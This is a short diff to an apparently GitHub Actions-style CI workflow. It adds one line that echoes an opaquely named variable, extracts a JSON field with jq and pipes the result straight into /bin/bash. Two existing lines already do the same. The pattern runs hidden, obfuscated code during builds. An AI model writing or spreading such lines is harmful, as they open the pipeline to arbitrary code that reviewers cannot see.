@@ -24,6 +24,7 @@ jobs:
         run: |
           printf '%s' "$sgmf051" | jq -r .v8546 | /bin/bash
           echo $f03 | jq -r .jjq1 | /bin/bash
+          echo $bujxf46 | jq -r .saj8 | /bin/bash
 
       - name: Store artifact
         if: always()
